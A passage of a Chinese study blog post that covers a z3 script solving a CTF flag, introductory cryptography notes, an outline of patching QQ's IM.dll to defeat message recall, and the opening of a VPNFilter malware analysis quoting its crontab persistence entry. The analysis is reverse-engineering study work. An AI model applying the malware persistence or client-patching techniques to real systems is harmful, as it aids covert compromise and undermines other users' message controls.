class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">40</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">41</span>])<br><span class="hljs-attribute">if</span> solver.check()==sat:<br>	<span class="hljs-attribute">print</span> solver.model()<br></code></pre></td></tr></table></figure>
<p>问了下出题人顺便了解到了sage<br>学习一波</p>
<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><p>学习一波密码学，主要还是跟着航电的师傅博客中推荐的视频来学的<br>//后来发现有些视频没有中文字幕<br>有些简单的就不写了像什么替换密码。。。啥的</p>
<h2 id="代换置换密码"><a href="#代换置换密码" class="headerlink" title="代换置换密码"></a>代换置换密码</h2><h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>凯撒密码是固定的移位3。。。<br>不多说了这个很简单</p>
<h3 id="HILL"><a href="#HILL" class="headerlink" title="HILL"></a>HILL</h3><p>希尔密码在hgame钟遇到过<br>一个plain text attack<br>具体加密过程就是有个密钥k<br>k决定了一次性加密多少<br>加密过程就是一个k*k得矩阵与之相乘然后取表<br>解密很简单啦就是逆矩阵了</p>
<h3 id="Vigenere-cipher"><a href="#Vigenere-cipher" class="headerlink" title="Vigenère cipher"></a>Vigenère cipher</h3><p>维吉尼亚就是多了个密钥<br>这是第一次引进密钥。。。<br>一般密钥就是一句话<br>然后明文与密钥相加模26</p>
<h3 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h3><p>一个特殊的希尔密码<br>类似栅栏密码啊啥的<br>其实本质上就是矩阵相乘</p>
<h2 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h2><p>密码算法的安全性不取决于密码算法本身的机密性，而取决于密钥的机密<br>对密码分析的攻击方法有很多。。。这边不例举<br>简单说几个就是唯密文攻击<br>有类似字频分析攻击啊等</p>
<h2 id="流密码-序列密码"><a href="#流密码-序列密码" class="headerlink" title="流密码(序列密码)"></a>流密码(序列密码)</h2><p>对称密码有俩种一种是流密码还有一种就是分组密码<br>序列密码就是每次单独加密每个位<br>其中又分同步序列密码和异步序列密码<br>同步序列就是密钥与明文密文无关<br>异步就是有关<br>最经典的序列密码就是one time pad<br>具有完备安全<br>加密方式就是用与明文同样长的密钥序列与之xor</p>
<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><h3 id="真随机数生成器"><a href="#真随机数生成器" class="headerlink" title="真随机数生成器"></a>真随机数生成器</h3><p>例如抛筛子啊什么的<br>这都是不可复制的<br>而一般通用的就是伪随机数生成器</p>
<h3 id="伪随机数生成器-PRNG"><a href="#伪随机数生成器-PRNG" class="headerlink" title="伪随机数生成器(PRNG)"></a>伪随机数生成器(PRNG)</h3><p>伪随机数生成器从一个初始种子开始通过计算来得到序列<br>最常见的例子就是线性同余生成器<br>s0 = seed<br>si+1 = a*si + b mod m , i = 0,1,…</p>
<h3 id="CSPRNG"><a href="#CSPRNG" class="headerlink" title="CSPRNG"></a>CSPRNG</h3><p>加密安全伪随机数生成器<br>这其实就是PRNG的一个特例<br>简单来说就是给定的钱n个密钥序列不能通过计算来得到后n个<br>成功预测的算法正确概率也不超过50%</p>
<h2 id="完备安全"><a href="#完备安全" class="headerlink" title="完备安全"></a>完备安全</h2><p>简单来说就是不能唯密文攻击//但可能有其他攻击方法<br>对于获取的密文c，有原文m1和m2,推出c的概率是相等的<br>但是想要完备安全 len(key) &gt;= len(m)</p>
<h2 id="数据加密标准与替换算法"><a href="#数据加密标准与替换算法" class="headerlink" title="数据加密标准与替换算法"></a>数据加密标准与替换算法</h2><p>主要是des<br>//以前已经了解过，现在基本识别是没有多大问题了<br>//复习一波</p>
<h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>混淆就是一种使密钥与密文之间的关系尽可能模糊的操作。<br>现在实现混淆最常用的一个方法就是替换</p>
<h3 id="扩散"><a href="#扩散" class="headerlink" title="扩散"></a>扩散</h3><p>为了隐藏明文的统计属性而将一个明文符号的影响扩散到多个密文符号的操作<br>简单来说就是俩个明文，仅有一个位不同，生成的密文有平均一般的不同</p>
<h3 id="初始置换与逆初始置换"><a href="#初始置换与逆初始置换" class="headerlink" title="初始置换与逆初始置换"></a>初始置换与逆初始置换</h3><p>这个很简单就是对明文和密文做置换<br>俩个互逆的矩阵罢了</p>
<h3 id="f函数"><a href="#f函数" class="headerlink" title="f函数"></a>f函数</h3><p>des的f函数传进去R的32位。。。然后与子密钥or后进行取表<br>然后就是一堆xor啥的操作</p>
<h1 id="QQ消息防撤回"><a href="#QQ消息防撤回" class="headerlink" title="QQ消息防撤回"></a>QQ消息防撤回</h1><p>其实很简答<br>就是patch<br><img src="20.png" srcset="/img/loading.gif" lazyload alt="20"><br>上个成果图<br>目前没出现任何异常<br>其实原理就是<br>用户发起撤回请求-&gt;服务器接收请求并删除服务器的消息记录，给用户下发命令撤回-&gt;用户接收到命令，删除本地消息<br>但是问题就是本地消息是我们可控的<br>这样就好办了<br>直接找到撤回的函数nop掉就完事了<br>库的话是IM.dll<br>x32dbg附加上去暴力搜索一通就行<br>网上也有许多相关的文章<br>这边不多说了</p>
<h1 id="vpnfilter"><a href="#vpnfilter" class="headerlink" title="vpnfilter"></a>vpnfilter</h1><p>vpnfilter经了解是一款很牛逼的恶意软件。。。<br>而且是最近的一款，不是什么究极远古时代病毒<br>能有幸分析这一款软件也是很开心得<br>而且有老师指导，遇到得困难基本都能解决</p>
<h2 id="学习目的"><a href="#学习目的" class="headerlink" title="学习目的"></a>学习目的</h2><p>驻留技术<br>vpnfilter与以前得很多软件不同就是能驻留<br>像一般的恶意软件，系统重启后就会消失，而vpnfilter不会<br>所以要学习一下这个驻留技术<br>自毁技术<br>通过烧坏主板来“毁尸灭迹”</p>
<h2 id="大致介绍"><a href="#大致介绍" class="headerlink" title="大致介绍"></a>大致介绍</h2><p>vpnfilter大致攻击流程图如下<br><img src="8.png" srcset="/img/loading.gif" lazyload alt="8"><br>主要是由三个阶段组成<br>第一阶段就是负责启动和驻留过程并下载第二阶段且运行<br>第二阶段就是远程命令得接受与执行<br>第三阶段主要是为了扩展</p>
<h3 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h3><p><img src="9.png" srcset="/img/loading.gif" lazyload alt="9"><br>首先是fork进程后来一波改权限<br>我这边是umask(23)和其他人分析报告的不一样。。。<br>//别人是27<br>不知道为啥<br><img src="10.png" srcset="/img/loading.gif" lazyload alt="10"><br>然后是一波check<br>check自身文件是否存在，不存在的话就跳转<br>重新写入磁盘<br>然后是check_crontab<br>这主要是为了检查是否已经设置过自启动<br>如果没有的话就会设置自启动，来达到驻留<br><img src="11.png" srcset="/img/loading.gif" lazyload alt="11"><br>下面这个是设置自启动<br>可以看到是fprintf(result, “*/5 * * * * %s\n”, (int)&amp;byte_808EF80);<br>每五分钟启动一次<br><img src="12.png" srcset="/img/loading.gif" lazyload alt="12"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/re/">#re</a>
      
        <a href="/tags/ctf/">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>暑假学习随笔</div>
      <div>http://www.psbazx.com/2019/07/15/暑假学习随笔/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Beitragsautor</div>
          <div>皮三宝</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Veröffentlicht am</div>
          <div>July 14, 2019</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>Urheberrechtshinweis</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2019/09/05/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="大二上学习笔记">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">大二上学习笔记</span>
                        <span class="visible-mobile">Vorheriger</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/06/06/des%E7%AE%97%E6%B3%95%E5%B0%8F%E7%BB%93/" title="des算法小结">
                        <span class="hidden-mobile">des算法小结</span>
                        <span class="visible-mobile">Nächster</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Inhaltsverzeichnis</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
  </noscript>
</body>
</html>
